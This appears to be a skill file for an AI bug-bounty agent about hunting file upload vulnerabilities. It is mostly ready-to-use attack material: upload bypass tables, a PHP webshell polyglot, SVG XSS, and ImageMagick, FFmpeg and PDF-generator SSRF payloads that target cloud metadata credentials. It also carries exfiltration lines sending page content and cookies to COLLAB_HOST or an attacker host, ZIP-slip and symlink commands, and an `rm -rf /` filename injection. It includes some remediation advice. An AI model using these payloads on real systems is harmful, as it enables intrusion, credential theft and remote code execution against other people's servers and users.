---
name: hunt-file-upload
description: "Hunt file upload bugs — RCE via webshell, XSS via SVG/HTML, SSRF via XXE in DOCX, path traversal via filename. Bypass tables (10 techniques): double extension (shell.php.jpg if server checks last ext only), magic bytes spoofing (PNG header on PHP), null byte (shell.php\0.jpg), case (PHP, .Php, .pHP), .htaccess upload to enable execution, SVG with <script>, HTML/SVG XSS, DOCX with embedded XXE, ZIP slip (../../../etc/passwd in archive), polyglot files. Detection: any /upload, /avatar, /profile-picture, /attachment, /import endpoint. Test: upload PHP/JSP/ASPX shells, request via direct URL, check response. Validate: actual code execution (whoami output) for RCE; reflected XSS in profile-photo URL. Use when testing file upload features, avatar/attachment endpoints, import/export functions, XML/DOCX/ZIP processors. Real paid examples."
sources: hackerone_public, cve_database, owasp, public_research
report_count: 5
cwe: [CWE-434, CWE-22, CWE-79, CWE-611, CWE-918]
cvss_baseline: "Medium (5.4-6.1) stored XSS via served SVG/HTML → High (7.5-8.6) SSRF/LFI via image/PDF processor → Critical (9.8) webshell RCE or presigned-URL arbitrary-object write."
related_skills: [hunt-rce, hunt-xxe, hunt-xss, hunt-ssrf, hunt-cloud-misconfig, triage-validation]
---

## 9. FILE UPLOAD

### Content-Type Bypass
```
filename=shell.php, Content-Type: image/jpeg  → server trusts Content-Type
filename=shell.phtml, shell.pHp, shell.php5   → extension variants
```

### File Upload Bypass Techniques (10 techniques)

| Attack | How | Prevention |
|---|---|---|
| Extension bypass | `shell.php.jpg`, `shell.pHp`, `shell.php5` | Allowlist + extract final extension |
| Null byte | `shell.php%00.jpg` | Sanitize null bytes |
| Double extension | `shell.jpg.php` | Only allow single extension |
| MIME spoof | Content-Type: image/jpeg with .php body | Validate magic bytes, not MIME header |
| Magic bytes prefix | Prepend `GIF89a;` to PHP code | Parse whole file, not just header |
| Polyglot | Valid as JPEG and PHP | Process as image lib, reject if invalid |
| SVG JavaScript | `<svg onload="...">` | Sanitize SVG or disallow entirely |
| XXE in DOCX | Malicious XML in Office ZIP | Disable external entities |
| ZIP slip | `../../../etc/passwd` in archive | Validate extracted paths |
| Filename injection | `; rm -rf /` in filename | Sanitize + use UUID names |

### Magic Bytes Reference

| Type | Hex |
|---|---|
| JPEG | `FF D8 FF` |
| PNG | `89 50 4E 47 0D 0A 1A 0A` |
| GIF | `47 49 46 38` |
| PDF | `25 50 44 46` |
| ZIP/DOCX/XLSX | `50 4B 03 04` |

### Stored XSS via SVG
```xml
<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.domain)</script>
</svg>
```

---

## ImageMagick / FFmpeg Exploitation

### ImageMagick SSRF / File Read (ImageTragick family + modern variants)
```bash
# Upload this as a .mvg or rename to .jpg/.png (magic bytes bypass)
# MVG SSRF payload — fetches internal URL during processing
cat > /tmp/ssrf.mvg << 'EOF'
push graphic-context
viewbox 0 0 640 480
fill 'url(http://169.254.169.254/latest/meta-data/iam/security-credentials/)'
pop graphic-context
EOF

# SVG SSRF (ImageMagick processes SVG remotely)
cat > /tmp/ssrf.svg << 'EOF'
<?xml version="1.0"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="http://COLLAB_HOST/imagemagick-ssrf" width="200" height="200"/>
</svg>
EOF

# WebP/AVIF processing bugs (modern surface — CVE-2023-4863)
# Upload a crafted WebP file targeting libwebp heap overflow
# Use: https://github.com/mistymntncop/CVE-2023-4863 PoC
```

### FFmpeg SSRF via HLS Playlist
```bash
# FFmpeg processes m3u8 playlists and fetches referenced segments
cat > /tmp/ssrf.m3u8 << 'EOF'
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
http://169.254.169.254/latest/meta-data/iam/security-credentials/
#EXT-X-ENDLIST
EOF

# Also works with concat demuxer
cat > /tmp/concat.txt << 'EOF'
ffconcat version 1.0
file 'http://COLLAB_HOST/ffmpeg-ssrf'
EOF

# Test: upload .m3u8 or video file to any video processing endpoint
```

---

## Headless Chrome / PDF Generator SSRF

### HTML → PDF Converter Attacks
```bash
# Target: invoice generators, report exporters, screenshot services
# Inject HTML that causes headless Chrome to fetch internal resources

# SSRF via CSS import
PAYLOAD='<html><head><style>@import url("http://169.254.169.254/latest/meta-data/");</style></head><body>test</body></html>'

# SSRF via HTML iframe
PAYLOAD='<html><body><iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/" width="1000" height="1000"></iframe></body></html>'

# Local file read
PAYLOAD='<html><body><iframe src="file:///etc/passwd" width="1000" height="1000"></iframe></body></html>'

# JavaScript execution (if sandbox not enforced)
PAYLOAD='<html><body><script>
fetch("http://COLLAB_HOST/chrome-rce?d=" + encodeURIComponent(document.documentElement.innerHTML));
</script></body></html>'

# Test: submit HTML to any /generate-pdf, /export, /screenshot, /report endpoint
curl -s -X POST "https://$TARGET/api/generate-pdf" \
  -H "Content-Type: application/json" \
  -d "{\"html\": \"$PAYLOAD\"}"
```

---

## Archive Extraction Attacks (Zip Slip / Symlink)

```bash
# Zip Slip — path traversal via archive filenames
pip3 install evilarc
python3 evilarc.py shell.php -o unix -p "../../../var/www/html/" -d 5 -f /tmp/zipslip.zip

# Symlink attack — archive contains symlink to sensitive file
mkdir -p /tmp/sym_attack
ln -s /etc/passwd /tmp/sym_attack/innocent.txt
zip -ry /tmp/symlink.zip /tmp/sym_attack/

# TAR symlink attack
tar --create --file=/tmp/symlink.tar --dereference /tmp/sym_attack/

# Test: upload to any /import, /extract, /unzip endpoint
curl -s -X POST "https://$TARGET/api/import" \
  -F "file=@/tmp/zipslip.zip"
```

---

## New Techniques (2024-2026)

### Cloud presigned-URL / direct-to-bucket upload abuse
Modern apps hand the client a presigned S3/GCS/Azure URL or a POST policy. Attack the *policy*, not the file:
- **Unconstrained key/path** — if the presigned PUT or POST-policy `key` is client-controlled without a prefix lock, upload to an arbitrary object path (overwrite another user's avatar, write to a web-served path, or `../`-style key traversal). 
- **Content-Type not pinned** in the policy → upload `text/html`/`image/svg+xml` served inline from the bucket origin → stored XSS on the storage domain (and sometimes the app origin via CDN).
- **Policy allows any bucket/ACL** → public-read or cross-tenant write. Cross-ref `hunt-cloud-misconfig`.
Capture the presign response, then replay the PUT with a changed `key`/`Content-Type`.

### Content-type sniffing → stored XSS even on "image-only" uploads
If the response serving the file lacks `X-Content-Type-Options: nosniff` and isn't on a sandboxed origin, a polyglot or mislabeled file is sniffed as HTML. Upload an image whose bytes also parse as HTML/JS; serve path renders as XSS. Also test SVG served with `image/svg+xml` (executes script) vs forced-download `Content-Disposition`.

### TOCTOU / race on validate-then-store
Some flows upload to a temp path, validate, then move/rename. Race the window: request the temp URL repeatedly during the validation gap, or re-upload the same name to swap a validated file for a malicious one before the move. Cross-ref `hunt-race-condition`.

### Image/document parser memory-safety & command CVEs
Server-side media pipelines remain a rich RCE/SSRF surface — identify the processor and match the CVE:
- **libwebp CVE-2023-4863** (heap overflow; ubiquitous via Chromium/Electron/image libs).
- **Ghostscript** CVE-2023-36664 / CVE-2021-3781 (command execution via crafted PostScript/EPS/PDF) — any "PDF/EPS thumbnail" feature.
- **ImageMagick** ImageTragick family + coder SSRF (MVG/SVG/MSL) still alive on legacy farms.
- **ExifTool CVE-2021-22204** (RCE via crafted DjVu/metadata) on avatar/EXIF pipelines.
Fingerprint via error strings, response headers, or thumbnail behavior, then test the matching PoC against your own test asset.

### Filename path traversal to overwrite (not just place)
`filename=../../../../app/config/settings.py` or `..%2f` to overwrite config/cron/web files where the server joins the raw filename to a path. Also test leading `/`, UNC `\\`, and unicode/overlong-UTF-8 separators.

## Remediation

- Validate type by parsing/re-encoding the file (decode the image and re-emit), not by extension/MIME header; store with a server-generated UUID name and no user-controlled path.
- Serve user uploads from a separate, sandboxed origin (no cookies) with `Content-Disposition: attachment` and `X-Content-Type-Options: nosniff`; never execute from the upload directory.
- For presigned URLs, lock the key prefix, content-type, size, and ACL in the policy server-side; validate ownership of the resulting object.
- Disable external entities and risky coders in parsers (ImageMagick policy.xml, disable Ghostscript where unneeded); keep media libraries patched; isolate processing workers from internal network and cloud metadata.
- Validate archive member paths (reject `../`, absolute, symlinks) before extraction.

## Validation Gate

- **RCE:** a real `whoami`/`id` round-trip from the served shell — not merely "upload accepted".
- **XSS:** the script fires in a victim browser on a meaningful origin (note if it's a sandboxed storage domain — that lowers impact).
- **SSRF/LFI:** internal/metadata/file content actually returned via the processor.
- A file that is stored but never served, executed, or parsed is a write-only blob, not a finding.

## Related Skills & Chains

- **`hunt-rce`** — File upload is the most common path to RCE on classic PHP/JSP/ASPX stacks once you find a directly-served upload directory or a deserializer-fed processor. Chain primitive: polyglot `GIF89a;<?php system($_GET['c']);?>` bypasses magic-byte check + `.phtml` extension bypasses allowlist → `GET /uploads/shell.phtml?c=id` → RCE; or PHP `phar://` upload to a sink calling `file_exists()` on the attacker-controlled path → PHP object deserialization → RCE.
- **`hunt-xxe`** — Office formats (DOCX/XLSX/PPTX), SVGs, and SOAP attachments are XML inside a ZIP — every upload-and-parse feature is a latent XXE candidate. Chain primitive: upload DOCX whose `[Content_Types].xml` or `word/document.xml` includes a parameter-entity DTD pointing at attacker-controlled DTD → blind XXE OOB file read → exfil `/etc/passwd` or `web.config` via the document parser.
- **`hunt-xss`** — SVGs, HTML files, and PDFs uploaded then served on the same origin are stored-XSS factories. Chain primitive: upload SVG with `<script>fetch('//attacker/?'+document.cookie)</script>` → victim views attachment at `app.target.com/uploads/x.svg` (same origin, not sandboxed) → cookie theft → ATO via session hijack.
- **`hunt-ssrf`** — Image-processing libraries (ImageMagick, ffmpeg) fetch remote URLs from inside the uploaded file. Chain primitive: upload an SVG/MVG with `<image xlink:href="http://169.254.169.254/latest/meta-data/iam/security-credentials/">` or ffmpeg `concat:http://internal/...` → SSRF to AWS IMDS → cloud creds; the ImageTragick CVE-2016-3714 family is still alive on legacy farms.
- **`security-arsenal`** — Reach for the file-upload bypass tree: 10-row extension/MIME/magic-byte bypass table (double-ext, null-byte, case variants, `.phtml`/`.phar`/`.php5`/`.pht`, `.htaccess` upload to re-enable handlers, `web.config` upload on IIS), SVG/MVG/SVGZ payloads, DOCX-XXE templates, ZIP-slip path traversal in archives, polyglot generators.
- **`triage-validation`** — Apply the Reproducibility Gate. A file successfully uploaded but never served, never executed, never parsed by anything is not a finding — it's a write-only blob. Critical RCE requires the actual `whoami` round-trip from the uploaded shell; stored XSS requires the popup firing in a victim browser, not just the file existing on disk.